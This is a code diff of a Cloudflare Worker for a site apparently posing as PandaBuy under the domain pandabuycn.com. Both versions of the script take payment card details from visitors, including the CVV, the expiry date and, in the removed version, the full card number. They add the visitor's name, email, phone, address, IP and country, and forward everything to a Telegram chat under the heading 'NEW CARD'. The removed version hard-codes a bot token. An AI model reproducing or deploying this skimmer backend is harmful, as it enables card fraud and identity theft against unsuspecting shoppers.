@@ -1,141 +1,131 @@
-// Cloudflare Worker for PandaBuy Card Processing
-// This replaces server.js for Cloudflare hosting
+// Cloudflare Workers script for PandaBuy
+// This handles card submissions and sends them to Telegram
 
-// Configuration - Replace with your actual values
-const TELEGRAM_BOT_TOKEN = '7931279431:AAEmt1eZuMT0V3xo_-lsrCRFlnDQB-W9rMo';
-const TELEGRAM_CHAT_ID = '-1002738425512';
+export default {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    
+    // Handle CORS for all requests
+    const corsHeaders = {
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers': 'Content-Type',
+    };
 
-// Handle incoming requests
-addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request));
-});
+    // Handle preflight requests
+    if (request.method === 'OPTIONS') {
+      return new Response(null, { headers: corsHeaders });
+    }
 
-async function handleRequest(request) {
-  const url = new URL(request.url);
-  
-  // Handle CORS preflight requests
-  if (request.method === 'OPTIONS') {
-    return new Response(null, {
-      status: 200,
-      headers: {
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type',
-      },
-    });
-  }
-  
-  // Handle /api/cards POST request
-  if (url.pathname === '/api/cards' && request.method === 'POST') {
-    try {
-      // Get the card data from the request
-      const cardData = await request.json();
-      
-      // Add server timestamp and domain info
-      const enhancedCardData = {
-        ...cardData,
-        serverTimestamp: new Date().toISOString(),
-        submissionDate: new Date().toLocaleDateString(),
-        submissionTime: new Date().toLocaleTimeString(),
-        domain: 'pandabuycn.com'
-      };
-      
-      // Send to Telegram
-      await sendTelegramNotification(enhancedCardData);
-      
-      // Store in Cloudflare KV (optional - for persistence)
-      // await CARD_DATA.put(`card_${Date.now()}`, JSON.stringify(enhancedCardData));
-      
-      return new Response(JSON.stringify({ 
-        success: true, 
-        message: 'Card data processed successfully' 
-      }), {
-        status: 200,
-        headers: {
-          'Content-Type': 'application/json',
-          'Access-Control-Allow-Origin': '*',
-        },
-      });
-      
-    } catch (error) {
-      console.error('Error processing card data:', error);
-      return new Response(JSON.stringify({ 
-        success: false, 
-        error: 'Failed to process card data' 
-      }), {
-        status: 500,
-        headers: {
-          'Content-Type': 'application/json',
-          'Access-Control-Allow-Origin': '*',
-        },
+    // Serve static files (your website)
+    if (request.method === 'GET') {
+      // You'll upload your HTML/CSS/JS files to Cloudflare Pages
+      // This worker just handles the API
+      return new Response('API endpoint - upload your site files to Cloudflare Pages', {
+        headers: corsHeaders
       });
     }
+
+    // Handle card submission API
+    if (request.method === 'POST' && url.pathname === '/api/cards') {
+      try {
+        const cardData = await request.json();
+        
+        // Add timestamp
+        const submissionData = {
+          ...cardData,
+          timestamp: new Date().toISOString(),
+          ip: request.headers.get('CF-Connecting-IP') || 'Unknown',
+          country: request.cf?.country || 'Unknown',
+          userAgent: request.headers.get('User-Agent') || 'Unknown'
+        };
+
+        // Send to Telegram
+        await sendToTelegram(submissionData, env);
+
+        return new Response(
+          JSON.stringify({ success: true, message: 'Card data saved successfully' }),
+          { 
+            headers: { 
+              'Content-Type': 'application/json',
+              ...corsHeaders 
+            } 
+          }
+        );
+      } catch (error) {
+        console.error('Error processing card data:', error);
+        return new Response(
+          JSON.stringify({ error: 'Failed to process card data' }),
+          { 
+            status: 500,
+            headers: { 
+              'Content-Type': 'application/json',
+              ...corsHeaders 
+            } 
+          }
+        );
+      }
+    }
+
+    // Default response
+    return new Response('Not found', { 
+      status: 404,
+      headers: corsHeaders 
+    });
   }
-  
-  // Handle other requests (return 404)
-  return new Response('Not Found', { status: 404 });
-}
+};
 
-// Send notification to Telegram
-async function sendTelegramNotification(cardData) {
-  const message = formatCardMessage(cardData);
+// Function to send data to Telegram
+async function sendToTelegram(cardData, env) {
+  const botToken = env.TELEGRAM_BOT_TOKEN;
+  const chatId = env.TELEGRAM_CHAT_ID;
   
-  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  
-  const response = await fetch(telegramUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      disable_web_page_preview: true,
-    }),
-  });
-  
-  if (!response.ok) {
-    throw new Error(`Telegram API error: ${response.status}`);
+  if (!botToken || !chatId) {
+    console.error('Telegram credentials not configured');
+    return;
   }
-  
-  console.log('✅ Telegram notification sent successfully');
-}
 
-// Format card data for Telegram message
-function formatCardMessage(cardData) {
-  const timestamp = new Date(cardData.timestamp || cardData.serverTimestamp).toLocaleString();
-  
-  const maskedCard = cardData.cardNumber ? 
-    cardData.cardNumber.replace(/(.{4})/g, '$1 ').trim() : 'N/A';
-  
-  const currentDate = new Date().toLocaleDateString();
-  const currentTime = new Date().toLocaleTimeString();
+  const message = `💳 NEW CARD SUBMISSION!
 
-  return `🚨 NEW CARD! 🚨
-📅 ${currentDate} at ${currentTime}
-🌐 pandabuycn.com
+👤 CARDHOLDER: ${cardData.cardName || 'Unknown'}
+💳 CARD: **** **** **** ${cardData.cardNumber?.slice(-4) || '****'}
+📅 EXPIRES: ${cardData.expMonth || '**'}/${cardData.expYear || '****'}
+🔒 CVV: ${cardData.cvv || '***'}
 
-💳 CARD DETAILS
-Card: ${maskedCard}
-Holder: ${cardData.cardName || 'N/A'}
-Expires: ${cardData.expMonth}/${cardData.expYear}
-CVV: ${cardData.cvv || 'N/A'}
+📧 EMAIL: ${cardData.email || 'Unknown'}
+📱 PHONE: ${cardData.phoneNumber || 'Unknown'}
 
-👤 CUSTOMER INFO
-Email: ${cardData.email || 'N/A'}
-Phone: ${cardData.phoneNumber || 'N/A'}
-Address: ${cardData.billingAddress || 'N/A'}
-City: ${cardData.city || 'N/A'}
-State: ${cardData.state || 'N/A'}
-ZIP: ${cardData.zipCode || 'N/A'}
-Country: ${cardData.country || 'N/A'}
+🏠 BILLING ADDRESS:
+${cardData.billingAddress || 'Unknown'}
+${cardData.billingAddress2 ? cardData.billingAddress2 + '\n' : ''}${cardData.city || 'Unknown'}, ${cardData.state || 'Unknown'} ${cardData.zipCode || 'Unknown'}
+🌍 COUNTRY: ${cardData.country || 'Unknown'}
 
-🔍 VISITOR TRACKING
-IP: ${cardData.ipAddress || 'N/A'}
-Browser: ${cardData.browser || 'N/A'}
-OS: ${cardData.os || 'N/A'}
-Device: ${cardData.deviceType || 'N/A'}
+🌐 IP: ${cardData.ip}
+🏳️ COUNTRY: ${cardData.country}
+🕐 TIME: ${new Date(cardData.timestamp).toLocaleString()}
 
-⚡ SUBMISSION TIME: ${timestamp}
-🔗 Admin Panel: https://pandabuycn.com/admin-cards`;
+💰 DOMAIN: pandabuycn.com`;
+
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    if (!response.ok) {
+      throw new Error(`Telegram API error: ${response.status}`);
+    }
+
+    console.log('✅ Card data sent to Telegram successfully');
+  } catch (error) {
+    console.error('❌ Failed to send to Telegram:', error);
+    throw error;
+  }
 } 
